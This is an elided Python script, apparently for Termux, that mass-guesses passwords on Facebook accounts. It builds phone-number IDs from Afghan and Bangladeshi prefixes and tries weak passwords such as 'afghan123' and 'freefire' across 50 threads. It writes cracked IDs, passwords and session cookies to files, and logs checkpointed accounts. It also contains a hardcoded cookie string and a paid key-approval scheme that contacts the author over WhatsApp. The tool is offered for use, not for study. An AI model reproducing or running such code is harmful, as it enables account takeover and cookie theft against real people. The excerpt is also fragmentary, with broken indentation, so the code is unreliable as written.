...
try:
	...
	print(' \x1b[1;91m\x1b[1;96m\x1b[1;92m \x1b[1;96m[resma-OK')
...
def banner():
	print(f"""\033[1;32m
   `MM    d'  `MMMMMMMb.           6MMMMb  
 MM   d'   MM    `Mb          6M'  `Mb 
 MM  d'    MM     MM   ____   MM    M9 
 MM d'     MM     MM  6MMMMb  YM.  ,9  
 MMd'      MM    .M9 6M'  `Mb  YMMMMb  
 MMYM.     MMMMMMM9' MM    MM  6'  `Mb 
 MM YM.    MM  \M\   MM    MM 6M    MM 
 MM  YM.   MM   \M\  YM.  ,MM MM    MM 
 MM   YM.  MM    \M\  YMMMMMM YM.  ,M9 
_MM_   YM._MM_    \M\_     M9  YMMMM9  
                         ,M9           
                       ,MM9            
                      d9'              
\033[1;32m---------------------------------------------------------
\033[1;32m  AUTHOR    : RAYEES JANAN
\033[1;32m  GITHUB    : KINGJANAN404
\033[1;32m  FACEBOOK  : RAYEES JANAN
...
def main_approve():
    ...
    print(logo)
    try:
        key1 = open('//data/data/com.termux/files/home/.Nking.txt', 'r').read()
    except IOError:
        os.system('clear')
        myid = uuid.uuid4().hex[:10]
        kok = open('//data/data/com.termux/files/home/.Nking.txt', 'w')
        kok.write(myid + pro)
        kok.close()
        key1 = open('//data/data/com.termux/files/home/.Nking.txt', 'r').read()
        print(logo)
        ...
        zhid = input("CHOOSE  : ")
        if zhid in ["1", "01"]:
            os.system('xdg-open https://wa.me/+8801307213545?text=Hi+Rayees+Amir+I+Approve+My+Ley+Pleas+Approve+Bro++'+key1)

    r1 = requests.get('https://github.com/Ibrahim-ok404/Approval/blob/main/Approval.txt').text
    if key1 in r1:
        riaz()
    else:
        os.system('clear')
        ...
        if zhid in ["1", "01"]:
            os.system('xdg-open https://wa.me/+8801307213545?text=Hi+Rayees+Janan+I+Approve+My+Ley+Pleas+Approve+Bro++'+key1)
...
def menu():
	...
	_ALAMIN_(f'\033[1;92m[\033[1;92m\033[1;34m2\033[1;92m] AFG & BD RANDOM CLONE')
...
def passwrd():
	os.system('clear')
	banner()
	#print(f"\033[1;92m[\033[1;92m\033[1;31m\033[1;92m] YOUR NAME      \033[1;34m: \033[0;92m"+str(RAYEES JANAN))
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo} [resma] {h}[{k}{loop}/{len(id)}{h}] {h}[OK] {h}[{ok}] {h}[{''.format(loop/float(len(id)))}] ")
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r\x1b[1;91m [\033[1;91mJANAN-CP\033[1;91m] \033[1;91m '+idf+ ' | '+pw+'')
				...
				#print ()
				print(f'\r\x1b[1;92m [\033[1;92mresma-OK\033[1;92m] \033[1;92m '+idf+ ' | '+pw+'')
				#print('\r\x1b[1;96m [\033[1;93mCOOKIES\033[1;96m]\033[1;91m= \033[1;97m '+kuki+'')
				cek_apk(session,coki)
				open('/sdcard/resma-FILE-CLONE-OK','a').write(idf+'|'+pw+'|'+kuki+'\n')
				akun.append(idf+'|'+pw)
				break
...
def Y2():
    ...
    print('\033[1;96m[AFG CODE] \033[1;92m> \033[1;92m 077 - 078 - 070 - 079')
    ...
    with ThreadPool(max_workers=50) as ALAMIN:
        ...
        print(f"\033[1;92m---------------------------------------------------------")
        for love in user:
            pwv = [love,love[2:],love[1:],code+love,code+love[:3],'afghan123','afghanistan','۱۲۳۴۵۶','freefire']
            uid = code+love
...
def rcerek(uid,pwx,tl):
    ...
    # 'cookie': 'datr=SYMuZU-n3TZyssRAvHcA9zrN; sb=SYMuZZnQ5tAzmL6DyivriZr2; dnonce=AWlT0diB2nCKS552oouP-tCSIQ9QSHkDDrjuxfL2dzMSLJihysKJZPyr9D1NhsqKtgfUxAgQe-ToJcy0LgToLle0; m_pixel_ratio=1.8000000715255737; wd=400x728; fr=0txUiyZ3prrjB1Niy..BlLoNJ.2T.AAA.0.0.BlLoNj.AWXflqYmTqE',
    ...
    'viewport-width': '980',}
        	...
        	if 'c_user' in log_cookies:
        	    ...
        	    cid = coki[151:166]
        	    print ('')
        	    print('\033[1;92m[\033[1;92mresma-OK\033[1;92m] \033[1;92m'+uid+' | '+ps+ '\033[1;91m = \033[1;96m '+tahunng(cid))
        	    print ('\033[1;93m [\033[1;96mCookie \033[1;93m]\033[1;91m = \033[1;92m '+coki+'')
               ###### print ('\033[1;36m[‎ 🎉 ]\033[1;91m = \033[1;34m'+pro+'  \033[0;32m')
        	    cek_apk(session,coki)
        	    open('/sdcard/resma-RANDOM.OK.txt', 'a').write( uid+' | '+ps+'\n')
        	    oks.append(uid)
        	    break 
        	elif 'checkpoint' in log_cookies:
        	    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
        	    cid = coki[141:156]
        	   # print('\033[1;96m[MRJANAN.CP]\033[1;93m[😪]\033[1;96m'+cid+' | '+ps+'\033[1;94m.= '+tahunng(cid))
              #  print ('\033[1;32m[‎🥂🍻🍾🍷]\033[1;91m = \033[1;34m'+coki+'  \033[0;32m')
                #cek_apk(session,coki)
        	    open('/sdcard/resma-RANDOM-CP.txt', 'a').write( cid+' | '+ps+' \n')
        	    cps.append(uid)
        	    break          
        	else:
        	    continue
        ...
        sys.stdout.write('\r%s[resma-OK]\033[1;32m-%s/%s][OK-%s]\033[1;92m[CP-%s] \r'%(bi,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    ...
    'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
               ...
               ###### print ('\033[1;36m[‎ 🎉 ]\033[1;91m = \033[1;34m'+pro+'  \033[0;32m')
        	    ...
        	    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
        	    cid = coki[141:156]
        	   # print('\033[1;96m[resma.CP]\033[1;93m[😪]\033[1;96m'+cid+' | '+ps+'\033[1;94m.= '+tahunng(cid))
              #  print ('\033[1;32m[‎🥂🍻🍾🍷]\033[1;91m = \033[1;34m'+coki+'  \033[0;32m')
                #cek_apk(session,coki)
        	    open('/sdcard/resma-RANDOM-CP.txt', 'a').write( cid+' | '+ps+' \n')
        	    cps.append(uid)
...
def mex():
    ...
    try:
        ...
        os.system('am start https://wa.me/+8801307213545?text=Assalamowalikom%20Sir,%20I%20Want%20To%20Buy%20Your%20AlAmin%20Paid%20Tools.%20My%20Key:%20'+key1)
        mex()
    r = requests.get('https://github.com/Ibrahim-ok404/Approval/blob/main/Approval.txt').text
    if key1 in r:
